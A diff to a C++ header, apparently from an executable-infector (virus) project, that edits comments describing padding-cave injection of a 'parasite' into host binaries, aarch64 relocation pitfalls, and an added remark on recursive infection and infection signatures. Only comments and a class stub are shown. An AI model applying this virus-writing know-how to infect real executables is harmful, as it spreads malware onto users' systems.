@@ -28,7 +28,7 @@ namespace vt::infector {
 // cave" that the parasite can live in.
 //
 // WARNING: because the insertion point is always not going to be page aligned
-// (padding insertion), for arm's adrp insruction it will break if the parasite
+// (padding insertion), for arm's adrp instuction it will break if the parasite
 // refers to rodata.
 // For example:
 //
@@ -38,13 +38,18 @@ namespace vt::infector {
 // If the code is inserted at a place that is not a multiple of 4k, the
 // generated offset would be wrong.
 //
-// Make sure the parasite doesnt merge text with rodata for aarch64 if this
+// Make sure the parasite doesn't merge text with rodata for aarch64 if this
 // infection method is used. This is not a problem for x86-64 because the
 // lea offset(%rip),%rdi can be relocated safely even to places that are not
 // page aligned.
 //
+// Note that this algorithm is safe to recursively infect the victim, as long as
+// the padding space is not exhausted. It's recommended to use an infection
+// signature to avoid this.
+//
 // This algorithm is simple to implement, and hard to go wrong but the success
-// rate depends highly on the padding size. For small viruses this is a choice.
+// rate depends highly on the padding size. For small viruses this is a good
+// choice.
 class PaddingInfector {
  public:
   size_t injected_host_size() { return host_size_; }
